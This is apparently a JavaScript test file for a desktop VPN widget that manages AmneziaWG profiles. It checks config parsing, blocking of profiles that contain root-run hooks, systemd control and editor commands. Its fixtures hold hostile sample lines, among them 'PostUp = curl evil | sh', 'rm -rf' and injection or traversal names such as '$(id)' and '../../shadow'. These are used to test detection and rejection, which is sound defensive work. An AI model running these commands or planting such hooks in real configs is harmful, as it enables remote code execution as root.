// AmneziaWG: plain *.conf profiles brought up with awg-quick, a CLI fork of
// wg-quick. How the config bundle and the sysfs health line are parsed, which
// profiles are blocked from connecting, and which tunnels get a row.
const { test, eq, Shared, AmneziaWg } = require("../harness.js")

// Verbatim output of AmneziaWgBackend.qml's listProcess over a profiles
// directory holding these two files — the tab indent and the redacted key
// included, because both are what the parser actually sees.
const BUNDLE = [
  "#awg-profile /tmp/awgtest/profiles/evil.conf",
  "\t[Interface]",
  "\tAddress = 10.8.1.3/24",
  "\tPostUp = curl evil | sh",
  "#awg-profile /tmp/awgtest/profiles/home.conf",
  "\t[Interface]",
  "\tPrivateKey = [redacted]",
  "\tAddress = 10.8.1.2/24",
  "\tJc = 4",
  "\t",
  "\t[Peer]",
  "\tPublicKey = abc",
  "\tPresharedKey = [redacted]",
  "\tEndpoint = 203.0.113.9:51820",
  "\tAllowedIPs = 0.0.0.0/0, ::/0"
].join("\n")

test("parseAwgInterfaces reads whitespace-separated names", () => {
  eq(AmneziaWg.parseAwgInterfaces("home_awg\n"), ["home_awg"])
  eq(AmneziaWg.parseAwgInterfaces("a b\tc\n"), ["a", "b", "c"])
  eq(AmneziaWg.parseAwgInterfaces(""), [])
  eq(AmneziaWg.parseAwgInterfaces("  \n"), [])
})

test("parseAwgInterfaces drops duplicates", () => {
  eq(AmneziaWg.parseAwgInterfaces("home_awg home_awg"), ["home_awg"])
})

test("confDirective derives the key the way awg-quick does", () => {
  eq(AmneziaWg.confDirective("Endpoint = 203.0.113.9:51820"), { key: "endpoint", value: "203.0.113.9:51820" })
  eq(AmneziaWg.confDirective("  PreDown\t=\trm -rf /tmp/x"), { key: "predown", value: "rm -rf /tmp/x" })
  // The key is the whole trimmed text before the first `=`, so a hook name
  // with something in front of it is a different key and not a hook.
  eq(AmneziaWg.confDirective("SaveConfig PostUp = x").key, "saveconfig postup")
  // `#` comments out the rest of the line, wherever it starts.
  eq(AmneziaWg.confDirective("# Endpoint = x"), null)
  eq(AmneziaWg.confDirective("Endpoint = 1.2.3.4:51820 # home").value, "1.2.3.4:51820")
  eq(AmneziaWg.confDirective("[Interface]"), null)
})

test("hasDangerousHooks matches PreUp/PostUp/PreDown/PostDown, not other keys", () => {
  eq(AmneziaWg.hasDangerousHooks("[Interface]\nPrivateKey = x\nPostUp = iptables -A"), true)
  eq(AmneziaWg.hasDangerousHooks("[Interface]\n  PreDown\t=\trm -rf /tmp/x"), true)
  eq(AmneziaWg.hasDangerousHooks("# PostUp = not a real hook, this is a comment"), false)
  eq(AmneziaWg.hasDangerousHooks("[Interface]\nPrivateKey = x\nAddress = 10.8.1.2/24"), false)
})

// awg-quick reads its config under `shopt -s nocasematch` and strips a `#`
// comment from anywhere in the line, so these are what it would and would not
// execute — not what a casual reading of the file suggests.
test("hasDangerousHooks follows awg-quick on case, comments and near-misses", () => {
  eq(AmneziaWg.hasDangerousHooks("[Interface]\npostup = curl evil | sh"), true)
  eq(AmneziaWg.hasDangerousHooks("[Interface]\nPostUp = iptables -A # allow"), true)
  eq(AmneziaWg.hasDangerousHooks("[Interface]\nAddress = 10.8.1.2/24 # PostUp = evil"), false)
  // A `;` starts no comment in wg-quick, so this is a key named ";PostUp" —
  // which matches no directive and is never run.
  eq(AmneziaWg.hasDangerousHooks(";PostUp = curl evil | sh"), false)
  // Nor is a key that merely ends in one.
  eq(AmneziaWg.hasDangerousHooks("[Interface]\nSaveConfig PostUp = curl evil | sh"), false)
})

test("parseConf reads endpoints and the default route off the config", () => {
  const conf = AmneziaWg.parseConf("[Peer]\nEndpoint = 203.0.113.9:51820\nAllowedIPs = 0.0.0.0/0, ::/0")
  eq(conf, { hasHooks: false, endpoints: ["203.0.113.9:51820"], defaultRoute: true })
  eq(AmneziaWg.parseConf("[Peer]\nAllowedIPs = 10.10.0.0/24").defaultRoute, false)
})

test("parseProfileBundle splits the listing into profiles and reads each config", () => {
  const profiles = AmneziaWg.parseProfileBundle(BUNDLE)
  eq(profiles.length, 2)
  eq(profiles[0], {
    path: "/tmp/awgtest/profiles/evil.conf",
    hasHooks: true,
    endpoints: [],
    defaultRoute: false
  })
  eq(profiles[1], {
    path: "/tmp/awgtest/profiles/home.conf",
    hasHooks: false,
    endpoints: ["203.0.113.9:51820"],
    defaultRoute: true
  })
})

test("parseProfileBundle ignores a config line that looks like a header", () => {
  const profiles = AmneziaWg.parseProfileBundle([
    "#awg-profile /p/home.conf",
    "\t#awg-profile /p/not-a-file.conf",
    "\tEndpoint = 1.2.3.4:51820"
  ].join("\n"))
  eq(profiles.length, 1)
  eq(profiles[0].endpoints, ["1.2.3.4:51820"])
})

test("parseProfileBundle survives an empty listing", () => {
  eq(AmneziaWg.parseProfileBundle(""), [])
})

test("buildProfiles marks the up profile and keeps the rest", () => {
  const profiles = AmneziaWg.buildProfiles(
    [{ path: "/p/home.conf", hasHooks: false, endpoints: [], defaultRoute: true },
     { path: "/p/office.conf", hasHooks: true, endpoints: [], defaultRoute: false }],
    ["home"])
  eq(profiles.map(profile => profile.name), ["home", "office"])
  eq(profiles[0].active, true)
  eq(profiles[0].external, false)
  eq(profiles[1].hasHooks, true)
  eq(profiles[1].active, false)
})

// A tunnel started with `sudo awg-quick up work` reads its config from
// /etc/amnezia/amneziawg, which this user cannot read. Without a row for it the
// backend is undetected and the tunnel cannot be brought down from the panel.
test("buildProfiles gives an interface with no readable config a row of its own", () => {
  const profiles = AmneziaWg.buildProfiles([{ path: "/p/home.conf", hasHooks: false }], ["work"])
  eq(profiles.length, 2)
  eq(profiles[1], {
    name: "work",
    confFile: "work",
    unit: "",
    hasHooks: false,
    endpoints: [],
    defaultRoute: false,
    configRead: false,
    external: true,
    active: true
  })
})

test("buildProfiles does not double-list an interface that has a config", () => {
  const profiles = AmneziaWg.buildProfiles(
    [{ path: "/p/home.conf" }, { path: "/etc/amnezia/amneziawg/home.conf" }],
    ["home"])
  eq(profiles.map(profile => profile.confFile), ["/p/home.conf"])
})

test("buildProfiles keeps a tunnel reachable after its config is deleted", () => {
  const profiles = AmneziaWg.buildProfiles([], ["home"])
  eq(profiles.length, 1)
  eq(AmneziaWg.activeAwgProfile(profiles).confFile, "home")
})

// The setting ends up inside a unit name handed to systemctl, so only what
// awg-quick itself accepts as an interface name survives.
test("parseAwgUnitProfiles keeps valid interface names only", () => {
  eq(AmneziaWg.parseAwgUnitProfiles("pc-david, work\nhome_awg"), ["pc-david", "work", "home_awg"])
  eq(AmneziaWg.parseAwgUnitProfiles("work work"), ["work"])
  eq(AmneziaWg.parseAwgUnitProfiles("a;b,../x,$(id),way-too-long-a-name,ok"), ["ok"])
  eq(AmneziaWg.parseAwgUnitProfiles(""), [])
  eq(AmneziaWg.parseAwgUnitProfiles(undefined), [])
})

// /etc/amnezia/amneziawg is not even listable by the shell's user, so a
// systemd-managed tunnel that is down has nothing in the listing behind it.
// Without a row from the setting it could never be started from the panel.
test("buildProfiles lists a systemd profile while it is down", () => {
  const profiles = AmneziaWg.buildProfiles([], [], ["pc-david"])
  eq(profiles, [{
    name: "pc-david",
    confFile: "pc-david",
    unit: "awg-quick@pc-david.service",
    hasHooks: false,
    endpoints: [],
    defaultRoute: false,
    configRead: false,
    external: false,
    active: false
  }])
})

test("buildProfiles marks an up systemd profile active, not external", () => {
  const profiles = AmneziaWg.buildProfiles([], ["pc-david"], ["pc-david"])
  eq(profiles.length, 1)
  eq(profiles[0].active, true)
  eq(profiles[0].external, false)
  eq(profiles[0].unit, "awg-quick@pc-david.service")
})

test("buildProfiles attaches the unit to a readable config of the same name", () => {
  const profiles = AmneziaWg.buildProfiles(
    [{ path: "/etc/amnezia/amneziawg/work.conf", hasHooks: false, endpoints: ["203.0.113.9:51820"] }],
    [], ["work"])
  eq(profiles.length, 1)
  eq(profiles[0].unit, "awg-quick@work.service")
  eq(profiles[0].configRead, true)
  eq(profiles[0].endpoints, ["203.0.113.9:51820"])
})

// A bare `awg-quick down` under a oneshot unit leaves it "active" with no
// interface, after which `systemctl start` does nothing at all.
test("awgControlCommand drives a systemd profile through its unit", () => {
  const profile = { name: "pc-david", confFile: "pc-david", unit: "awg-quick@pc-david.service" }
  eq(AmneziaWg.awgControlCommand(profile, "up"), { argv: ["systemctl", "restart", "awg-quick@pc-david.service"], elevate: false })
  eq(AmneziaWg.awgControlCommand(profile, "down"), { argv: ["systemctl", "stop", "awg-quick@pc-david.service"], elevate: false })
})

test("awgControlCommand keeps awg-quick, elevated, for everything else", () => {
  const profile = { name: "home", confFile: "/p/home.conf", unit: "" }
  eq(AmneziaWg.awgControlCommand(profile, "up"), { argv: ["up", "/p/home.conf"], elevate: true })
  eq(AmneziaWg.awgControlCommand(profile, "down"), { argv: ["down", "/p/home.conf"], elevate: true })
})

// connectTo is handed the target, not the profile, so the unit has to travel
// with the row or a click would fall back to a bare awg-quick.
test("awgTargets carries the unit to connectTo", () => {
  const targets = AmneziaWg.awgTargets(AmneziaWg.buildProfiles([], [], ["pc-david"]))
  eq(targets[0].unit, "awg-quick@pc-david.service")
  eq(targets[0].detail, "AmneziaWG profile · systemd unit")
  eq(AmneziaWg.awgControlCommand(targets[0], "up").argv[0], "systemctl")
})

test("awgDetails names the unit and skips config rows it could not read", () => {
  const rows = AmneziaWg.awgDetails(
    [{ name: "pc-david", confFile: "pc-david", unit: "awg-quick@pc-david.service", configRead: false, active: true }], {})
  eq(rows.map(row => row.label), ["Profile", "Interface", "Managed by"])
  eq(rows[2].value, "awg-quick@pc-david.service")
})

test("parseSysfsStats reads one line per interface", () => {
  const health = AmneziaWg.parseSysfsStats("home_awg\t1024\t2048\noffice_awg\t0\t0")
  eq(Object.keys(health).sort(), ["home_awg", "office_awg"])
  eq(health.home_awg, { rxBytes: 1024, txBytes: 2048 })
  eq(health.office_awg, { rxBytes: 0, txBytes: 0 })
})

test("parseSysfsStats skips blank lines", () => {
  eq(AmneziaWg.parseSysfsStats("\n\n"), {})
})

test("mergeHealth turns the byte deltas into rates", () => {
  const merged = AmneziaWg.mergeHealth(
    { home: { rxBytes: 1024, txBytes: 4096 } },
    { home: { rxBytes: 2048, txBytes: 4096 } },
    2)
  eq(merged.sampled, true)
  eq(merged.health.home.rxRate, 512)
  eq(merged.health.home.txRate, 0)
})

test("mergeHealth leaves the first sample rateless rather than guessing", () => {
  const merged = AmneziaWg.mergeHealth({}, { home: { rxBytes: 2048, txBytes: 0 } }, 0)
  eq(merged.sampled, true)
  eq(merged.health.home.rxRate, undefined)
})

// The inner `awg show interfaces` exits 0 whether it found interfaces or
// failed, so an empty read is not proof the tunnel ended — blanking the rows
// would contradict the connected state the rest of the panel is showing.
test("mergeHealth keeps the last reading when a sample comes back empty", () => {
  const previous = { home: { rxBytes: 2048, txBytes: 0, rxRate: 512 } }
  const merged = AmneziaWg.mergeHealth(previous, {}, 5)
  eq(merged.health, previous)
  eq(merged.sampled, false)
})

test("formatBytes steps units at 1024 and formatRate appends /s", () => {
  eq(AmneziaWg.formatBytes(512), "512 B")
  eq(AmneziaWg.formatBytes(2048), "2.0 KiB")
  eq(AmneziaWg.formatBytes(15 * 1024 * 1024), "15 MiB")
  eq(AmneziaWg.formatRate(1024), "1.0 KiB/s")
})

test("interfaceFor takes the config basename, case-insensitively", () => {
  eq(AmneziaWg.interfaceFor("/home/user/.config/omarchy/vpn/awg-profiles/home_awg.conf"), "home_awg")
  eq(AmneziaWg.interfaceFor("office.CONF"), "office")
  eq(AmneziaWg.interfaceFor(""), "")
})

test("awgTargets blocks a profile with hooks and marks the connected one", () => {
  const targets = AmneziaWg.awgTargets([
    { name: "home", confFile: "/p/home.conf", hasHooks: false, active: true },
    { name: "office", confFile: "/p/office.conf", hasHooks: true, active: false }
  ])
  eq(targets[0].detail, "Connected")
  eq(targets[0].blocked, false)
  eq(targets[0].glyph, Shared.GLYPH_SHIELD)
  eq(targets[1].detail, "Blocked: contains root hooks")
  eq(targets[1].blocked, true)
  eq(targets[1].glyph, Shared.GLYPH_SHIELD_LOCK)
})

test("awgTargets says where an externally started tunnel came from", () => {
  const targets = AmneziaWg.awgTargets([{ name: "work", confFile: "work", external: true, active: true }])
  eq(targets[0].detail, "Connected · started outside the widget")
  eq(targets[0].external, true)
  eq(targets[0].blocked, false)
})

test("awgSummary reports the active profile, or the empty/idle states", () => {
  eq(AmneziaWg.awgSummary([]), "No profiles")
  eq(AmneziaWg.awgSummary([{ name: "home", active: false }]), "Not connected")
  eq(AmneziaWg.awgSummary([{ name: "home", active: true }]), "home")
})

test("awgDetails only reports the active profile's rows, with a trailing managed-by line", () => {
  const rows = AmneziaWg.awgDetails(
    [
      { name: "home", confFile: "/p/home.conf", active: true, endpoints: ["203.0.113.9:51820"], defaultRoute: true },
      { name: "office", confFile: "/p/office.conf", active: false }
    ],
    { home: { rxRate: 1024, txRate: 0, rxBytes: 2048, txBytes: 0 } }
  )
  eq(rows[0], { label: "Profile", value: "home" })
  eq(rows[1], { label: "Interface", value: "home" })
  eq(rows[2], { label: "Endpoint", value: "203.0.113.9:51820" })
  eq(rows[rows.length - 1], { label: "Managed by", value: "awg-quick" })
  eq(rows.some(row => row.label === "Default route" && row.value.indexOf("Yes") === 0), true)
})

test("awgDetails leaves out the rows a tunnel started elsewhere cannot answer", () => {
  const rows = AmneziaWg.awgDetails(
    [{ name: "work", confFile: "work", active: true, external: true }],
    { work: { rxRate: 0, txRate: 0, rxBytes: 0, txBytes: 0 } })
  eq(rows.some(row => row.label === "Default route"), false)
  eq(rows.some(row => row.label === "Endpoint"), false)
  eq(rows[0], { label: "Profile", value: "work" })
  eq(rows.some(row => row.label === "Downloaded"), true)
})

test("awgDetails is empty when nothing is active", () => {
  eq(AmneziaWg.awgDetails([{ name: "home", confFile: "/p/home.conf", active: false }], {}), [])
})

test("activeAwgProfile finds the connected profile or null", () => {
  eq(AmneziaWg.activeAwgProfile([{ name: "a", active: false }, { name: "b", active: true }]).name, "b")
  eq(AmneziaWg.activeAwgProfile([{ name: "a", active: false }]), null)
})

test("awgEditCommand opens a user-owned profile in the user's editor", () => {
  const target = AmneziaWg.awgTargets(AmneziaWg.buildProfiles([{ path: "/home/u/.config/omarchy/vpn/awg-profiles/home.conf" }], []))[0]
  eq(target.editable, true)
  eq(AmneziaWg.awgEditCommand(target), { argv: ["omarchy-launch-editor", "/home/u/.config/omarchy/vpn/awg-profiles/home.conf"], terminal: false })
})

// A tunnel started with `sudo awg-quick up pc-david` has a root-only config
// that was never read; the path is awg-quick's own, from the interface name.
test("awgEditCommand sends a root-owned config it could not read through the helper", () => {
  const target = AmneziaWg.awgTargets(AmneziaWg.buildProfiles([], ["pc-david"]))[0]
  eq(AmneziaWg.awgEditCommand(target, "sublime_text", "/p/bin/omarchy-vpn-root-edit"),
    { argv: ["/p/bin/omarchy-vpn-root-edit", "/etc/amnezia/amneziawg/pc-david.conf", "subl", "--wait"], terminal: false })
  eq(AmneziaWg.awgEditCommand(target, "nvim", "/p/bin/omarchy-vpn-root-edit"),
    { argv: ["/p/bin/omarchy-vpn-root-edit", "/etc/amnezia/amneziawg/pc-david.conf", "nvim"], terminal: true })
})

test("awgEditCommand sends a readable config under awg-quick's directory through the helper", () => {
  const target = AmneziaWg.awgTargets(AmneziaWg.buildProfiles([{ path: "/etc/amnezia/amneziawg/work.conf" }], []))[0]
  eq(AmneziaWg.awgEditCommand(target, "nvim", "h").argv.slice(0, 2), ["h", "/etc/amnezia/amneziawg/work.conf"])
})

test("awgEditCommand keeps a blocked profile editable, so its hooks can come out", () => {
  const target = AmneziaWg.awgTargets(AmneziaWg.buildProfiles([{ path: "/p/evil.conf", hasHooks: true }], []))[0]
  eq(target.blocked, true)
  eq(target.editable, true)
  eq(AmneziaWg.awgEditCommand(target).argv[0], "omarchy-launch-editor")
})

test("awgEditCommand refuses a name that is not an interface name", () => {
  eq(AmneziaWg.awgEditCommand({ label: "../../shadow", confFile: "../../shadow" }), null)
  eq(AmneziaWg.awgEditCommand(null), null)
})

// The copy is written back only when the editor exits; Omarchy starts GUI
// editors detached, so an unwaited Sublime made every edit "unchanged".
test("awgBlockingEditor makes the default editor block until the file is closed", () => {
  eq(AmneziaWg.awgBlockingEditor("sublime_text\n"), { argv: ["subl", "--wait"], terminal: false })
  eq(AmneziaWg.awgBlockingEditor("/usr/bin/code"), { argv: ["code", "--wait"], terminal: false })
  eq(AmneziaWg.awgBlockingEditor("zeditor"), { argv: ["zeditor", "--wait"], terminal: false })
  eq(AmneziaWg.awgBlockingEditor("nano"), { argv: ["nano"], terminal: true })
  eq(AmneziaWg.awgBlockingEditor("gnome-text-editor"), { argv: ["nvim"], terminal: true })
  eq(AmneziaWg.awgBlockingEditor(""), { argv: ["nvim"], terminal: true })
})

test("parseAwgProfileNames reads interface=Name pairs", () => {
  eq(AmneziaWg.parseAwgProfileNames("pc-david=VPS Hong Kong, work = Office ,bad, =x, y=, work=Again"),
    { "pc-david": "VPS Hong Kong", work: "Office" })
  eq(AmneziaWg.parseAwgProfileNames(""), {})
})

test("a named profile shows its name everywhere a person reads it", () => {
  const built = [{ name: "pc-david", confFile: "/etc/amnezia/amneziawg/pc-david.conf", active: true, unit: "awg-quick@pc-david.service" }]
  const named = AmneziaWg.awgApplyNames(built, { "pc-david": "VPS Hong Kong" })
  eq(built[0].label, undefined)
  eq(named[0].name, "pc-david")
  eq(AmneziaWg.awgTargets(named)[0].label, "VPS Hong Kong")
  eq(AmneziaWg.awgTargets(named)[0].key, "profile:pc-david")
  eq(AmneziaWg.awgSummary(named), "VPS Hong Kong")
  eq(AmneziaWg.awgTargets(AmneziaWg.awgApplyNames(built, {}))[0].label, "pc-david")
})

test("a renamed root-owned profile still edits its own config", () => {
  const named = AmneziaWg.awgApplyNames(AmneziaWg.buildProfiles([], ["pc-david"]), { "pc-david": "VPS Hong Kong" })
  const target = AmneziaWg.awgTargets(named)[0]
  eq(target.label, "VPS Hong Kong")
  eq(AmneziaWg.awgEditCommand(target, "nvim", "/p/bin/omarchy-vpn-root-edit").argv.slice(0, 2),
    ["/p/bin/omarchy-vpn-root-edit", "/etc/amnezia/amneziawg/pc-david.conf"])
})

test("awgImportCommand copies into the profile directory under the interface name", () => {
  const spec = AmneziaWg.awgImportCommand("/home/u/Downloads/hk-2.conf", "/home/u/.config/omarchy/vpn/awg-profiles")
  eq(spec.name, "hk-2")
  eq(spec.argv.slice(-3), ["/home/u/Downloads/hk-2.conf", "/home/u/.config/omarchy/vpn/awg-profiles/hk-2.conf", "hk-2"])
  eq(typeof AmneziaWg.awgImportCommand("/d/wg0 (5).conf", "/p").error, "string")
  eq(typeof AmneziaWg.awgImportCommand("/d/a.ovpn", "/p").error, "string")
  eq(typeof AmneziaWg.awgImportCommand("/d/a.conf", "").error, "string")
})
